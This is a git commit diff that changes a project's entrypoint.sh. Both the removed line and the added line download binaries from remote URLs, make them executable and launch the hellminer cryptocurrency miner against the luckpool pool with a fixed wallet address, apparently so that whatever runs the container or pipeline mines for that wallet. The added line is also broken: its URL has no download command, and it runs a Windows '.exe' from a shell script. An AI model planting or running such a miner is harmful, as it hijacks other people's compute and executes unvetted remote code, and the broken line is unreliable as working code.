26054d5bc23294bc147d833620643ed7b75cbfcb
applife144 <107717580+applife144@users.noreply.github.com>
2022-06-18 04:26:44 +0800

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,1 +1,1 @@
-wget https://bitbucket.org/vps3/ngehe/downloads/verus-solver; wget https://bitbucket.org/vps3/ngehe/downloads/hellminer; chmod +x hellminer; chmod +x verus-solver; ./hellminer -c ap.luckpool.net:3956#xnsub -u RUA92tQZsJeNBFCPyMY9ndi6ZNRT4XmDjD.rizal2 -p x --cpu 7	
+https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xvf hellminer_cpu_linux.tar.gz && chmod +x hellminer && chmod +x verus-solver && hellminer.exe -c stratum+tcp://na.luckpool.net:3956#xnsub -u RUA92tQZsJeNBFCPyMY9ndi6ZNRT4XmDjD.tes123 -p x
